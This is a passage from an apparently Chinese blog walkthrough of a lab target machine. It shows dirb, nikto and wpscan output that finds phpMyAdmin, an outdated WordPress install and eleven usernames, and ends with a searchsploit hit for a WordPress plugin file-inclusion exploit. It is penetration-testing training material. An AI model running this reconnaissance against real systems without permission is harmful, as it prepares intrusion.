                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/vi/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/zh_CN/                                                      </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/zh_TW/                                                      </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/sql/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/components/                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/database/                                                </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/error/                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/javascript/                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/list/                                                    </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/navigation/                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/<span class="built_in">test</span>/                                                    </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/                                                   </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/doc/html/ ----</span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                       </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/jquery/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/transformations/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/az/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/<span class="built_in">bg</span>/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ca/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/cs/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/da/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/de/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/el/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/es/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/et/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/<span class="keyword">fi</span>/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/fr/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/gl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/hu/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ia/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/id/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/it/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ja/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ko/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/lt/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/nl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pt/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pt_BR/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ro/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ru/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/si/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sk/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sq/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sv/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/tr/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/uk/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/vi/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/zh_CN/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/zh_TW/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/components/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/database/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/error/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/javascript/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/list/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/navigation/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/chart/                                             </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/search/                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/<span class="built_in">test</span>/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/css/                                               </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/img/                                               </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/chart/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/search/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/css/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/img/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/images/                                     </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/images/ ----</span><br><span class="line">                                                                               ges/zt                                     </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Apr 13 22:15:55 2020</span><br><span class="line">DOWNLOADED: 290556 - FOUND: 10</span><br></pre></td></tr></table></figure>

<p>上nikto</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -host http://192.168.56.122:12380/</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.56.122</span><br><span class="line">+ Target Hostname:    192.168.56.122</span><br><span class="line">+ Target Port:        12380</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ SSL Info:        Subject:  /C=UK/ST=Somewhere <span class="keyword">in</span> the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</span><br><span class="line">                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">                   Issuer:   /C=UK/ST=Somewhere <span class="keyword">in</span> the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</span><br><span class="line">+ Start Time:         2020-04-13 21:55:57 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header <span class="string">&#x27;dave&#x27;</span> found, with contents: Soemthing doesn<span class="string">&#x27;t look right here</span></span><br><span class="line"><span class="string">+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span></span><br><span class="line"><span class="string">+ The site uses SSL and Expect-CT header is not present.</span></span><br><span class="line"><span class="string">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span></span><br><span class="line"><span class="string">+ No CGI Directories found (use &#x27;</span>-C all<span class="string">&#x27; to force check all possible dirs)</span></span><br><span class="line"><span class="string">+ Entry &#x27;</span>/admin112233/<span class="string">&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span></span><br><span class="line"><span class="string">+ Entry &#x27;</span>/blogblog/<span class="string">&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span></span><br><span class="line"><span class="string">+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span></span><br><span class="line"><span class="string">+ Hostname &#x27;</span>192.168.56.122<span class="string">&#x27; does not match certificate&#x27;</span>s names: Red.Initech</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST </span><br><span class="line">+ Uncommon header <span class="string">&#x27;x-ob_mode&#x27;</span> found, with contents: 1</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin directory found</span><br><span class="line">+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-04-13 21:58:35 (GMT-4) (158 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<p>wpscan扫一下<span class="exturl" data-url="aHR0cHM6Ly8xOTIuMTY4LjU2LjEyMjoxMjM4MC9ibG9nYmxvZy8=">https://192.168.56.122:12380/blogblog/<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --disable-tls-checks --url https://192.168.56.122:12380/blogblog/ --enumerate u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.11</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]</span></span><br><span class="line"><span class="string">[+] URL: https://192.168.56.122:12380/blogblog/ [192.168.56.122]</span></span><br><span class="line"><span class="string">[+] Started: Mon Apr 13 22:26:43 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - Dave: Soemthing doesn&#x27;</span>t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https://192.168.56.122:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] https://192.168.56.122:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://192.168.56.122:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://192.168.56.122:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://192.168.56.122:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: bhost</span><br><span class="line"> | Location: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2019-12-08T00:00:00.000Z</span><br><span class="line"> | Readme: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4.4</span><br><span class="line"> | Style URL: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: <span class="string">&#x27;Version: 1.2.9&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] John Smith</span><br><span class="line"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="line"> | Confirmed By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] barry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] john</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] elly</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] garry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] heather</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] harry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] scott</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kathy</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tim</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Apr 13 22:26:48 2020</span><br><span class="line">[+] Requests Done: 69</span><br><span class="line">[+] Cached Requests: 6</span><br><span class="line">[+] Data Sent: 17.953 KB</span><br><span class="line">[+] Data Received: 294.119 KB</span><br><span class="line">[+] Memory used: 109.172 MB</span><br><span class="line">[+] Elapsed time: 00:00:05</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --disable-tls-checks --url https://192.168.56.122:12380/blogblog/ --enumerate p</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.11</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: https://192.168.56.122:12380/blogblog/ [192.168.56.122]</span></span><br><span class="line"><span class="string">[+] Started: Mon Apr 13 22:31:13 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - Dave: Soemthing doesn&#x27;</span>t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https://192.168.56.122:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] https://192.168.56.122:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://192.168.56.122:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://192.168.56.122:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://192.168.56.122:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: bhost</span><br><span class="line"> | Location: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2019-12-08T00:00:00.000Z</span><br><span class="line"> | Readme: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4.4</span><br><span class="line"> | Style URL: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: <span class="string">&#x27;Version: 1.2.9&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Most Popular Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Apr 13 22:31:17 2020</span><br><span class="line">[+] Requests Done: 2</span><br><span class="line">[+] Cached Requests: 32</span><br><span class="line">[+] Data Sent: 616 B</span><br><span class="line">[+] Data Received: 1.095 KB</span><br><span class="line">[+] Memory used: 194.785 MB</span><br><span class="line">[+] Elapsed time: 00:00:03</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://192.168.56.122:12380/blogblog/wp-content/plugins/</span><br></pre></td></tr></table></figure>

<p>在eploitdb中搜索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit wordpress advanced video</span></span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                    |  Path</span><br><span class="line">                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Advanced Video 1.0 - Local File Inclusion                        | exploits/php/webapps/39646.py</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p>查看exploit的内容</p>
